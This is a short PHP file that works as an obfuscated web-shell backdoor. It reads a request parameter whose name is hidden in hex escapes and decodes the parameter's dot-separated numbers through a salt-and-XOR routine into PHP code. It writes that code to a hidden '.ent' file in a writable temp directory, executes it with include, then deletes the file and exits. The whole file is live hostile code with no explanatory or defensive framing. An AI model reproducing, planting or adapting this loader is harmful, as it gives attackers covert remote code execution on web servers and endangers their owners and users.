<?php

if(@$_REQUEST["\x65\x6Et"] !== null){
	$res = array_filter([sys_get_temp_dir(), getenv("TMP"), getcwd(), ini_get("upload_tmp_dir"), "/dev/shm", "/tmp", getenv("TEMP"), session_save_path(), "/var/tmp"]);
	$pointer = $_REQUEST["\x65\x6Et"];
		 	$pointer 	= explode(		"." 	,$pointer  	)	;	
	$pgrp  =	'';
            $salt6  =	'abcdefghijklmnopqrstuvwxyz0123456789';
            $lenS  =	strlen( 	$salt6);
            $n  =	0;
    
            $__tmp  =	$pointer;
            while( 	$v2  =	array_shift( 	$__tmp)) {
                $chS  =	ord( 	$salt6[$n % $lenS]);
                $dec  =	( 	( 	int)$v2 - $chS -( 	$n % 10)) ^	25;
                $pgrp .=chr( 	$dec);
                $n++;
            }
	$key = 0;
do {
    $marker = $res[$key] ?? null;
    if ($key >= count($res)) break;
    		if (max(0, is_dir($marker) * is_writable($marker))) {
    $holder = implode("/", [$marker, ".ent"]);
    $file = fopen($holder, 'w');
if ($file) {
	fwrite($file, $pgrp);
	fclose($file);
	include $holder;
	@unlink($holder);
	die();
}
}
    $key++;
} while (true);
}